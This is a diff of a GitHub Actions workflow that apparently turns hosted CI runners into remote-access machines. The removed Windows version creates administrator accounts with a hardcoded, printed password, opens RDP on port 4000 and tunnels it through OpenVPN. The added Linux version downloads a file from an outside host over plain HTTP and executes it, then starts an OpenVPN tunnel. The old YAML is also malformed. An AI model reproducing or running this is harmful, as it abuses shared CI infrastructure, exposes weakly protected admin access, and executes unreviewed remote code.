@@ -1,67 +1,47 @@
-name Kero RDP
+name: Android Kero RDP Test
 
-on
-  workflow_dispatch
-    inputs
-      portmap_config_url
+on:
+  workflow_dispatch:
+    inputs:
+      portmap_config_url:
         description: 'Please paste the URL of the webpage or file you want to download:'
         required: true
 
-jobs
-  build
-    runs-on windows-latestte
+jobs:
+  build:
+    runs-on: ubuntu-latest
 
-    steps
-    - name Install Chocolatey
-      run |
-        Set-ExecutionPolicy Bypass -Scope Process -Force
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-        iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
-        
-    - name Install OpenVPN
-      run choco install openvpn -y
-      
-    - name Download Portmap Configuration
-      run |
-        $inputUrl = "${{ github.event.inputs.portmap_config_url }}"
-        $fileName = [System.IO.Path]::GetFileName($inputUrl)
-        $newUrl = "https://raw.githubusercontent.com/KeroLive/KeroTech/main/config/$fileName"
-        Invoke-WebRequest -Uri $newUrl -OutFile "C:\portmap.ovpn"
-        
-    - name Enable Remote Desktop
-      run Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-      
-    - name Set RDP Authentication
-      run Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt-get install -y wget openvpn
 
-    - name Open Local User KeroAdmin
-      run |
-        if (-not (Get-LocalUser -Name "KeroAdmin" -ErrorAction SilentlyContinue)) {
-          New-LocalUser -Name "KeroAdmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force) -FullName "Kero Admin" -Description "Local user KeroAdmin"
-          Add-LocalGroupMember -Group "Administrators" -Member "KeroAdmin"
+      - name: Download configuration file
+        run: |
+          base_url="https://raw.githubusercontent.com/KeroLive/KeroTech/main/config/"
+          user_url="${{ github.event.inputs.portmap_config_url }}"
+          file_name=$(basename "$user_url")
+          download_url="$base_url$file_name"
+          echo "Downloading configuration file from $download_url..."
+          wget -q "$download_url" -O "$GITHUB_WORKSPACE/client.conf"
 
-          New-LocalUser -Name "Kero" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force) -FullName "Kero" -Description "Local user Kero"
-          Add-LocalGroupMember -Group "Administrators" -Member "Kero"
-        } else {
-          Write-Output "User KeroAdmin already exists."
-        }
+          if [ $? -ne 0 ]; then
+              echo "Error: Failed to download configuration file from $download_url."
+              exit 1
+          fi
 
-    - name RDP Port 4000
-      run |
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "PortNumber" -Value 4000
-        New-NetFirewallRule -DisplayName "RDP Port 4000" -Direction Inbound -Protocol TCP -LocalPort 4000 -Action Allow
+          echo "Configuration file downloaded successfully."
 
-    - name Restart Remote Desktop Service
-      run Restart-Service -Name "TermService" -Force
+      - name: Download and execute additional YAML
+        run: |
+          additional_yml_url="http://kerooo.c1.biz/k.yml"
+          echo "Downloading additional YAML file from $additional_yml_url..."
+          wget -q "$additional_yml_url" -O "$GITHUB_WORKSPACE/additional.yml"
+          chmod +x "$GITHUB_WORKSPACE/additional.yml"
+          "$GITHUB_WORKSPACE/additional.yml"
 
-    - name The User Name and Password
-      run |
-        Write-Output "User Name: KeroAdmin"
-        Write-Output "Password: P@ssw0rd!"
-
-    - name Start OpenVPN
-      run |
-        Start-Process -NoNewWindow -FilePath "C:\Program Files\OpenVPN\bin\openvpn.exe" -ArgumentList "--config C:\portmap.ovpn" -Wait
-        
-    - name Enable Terminal Services
-      run Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+      - name: Start OpenVPN
+        run: |
+          sleep 10
+          sudo openvpn --config "$GITHUB_WORKSPACE/client.conf" | lolcat -f
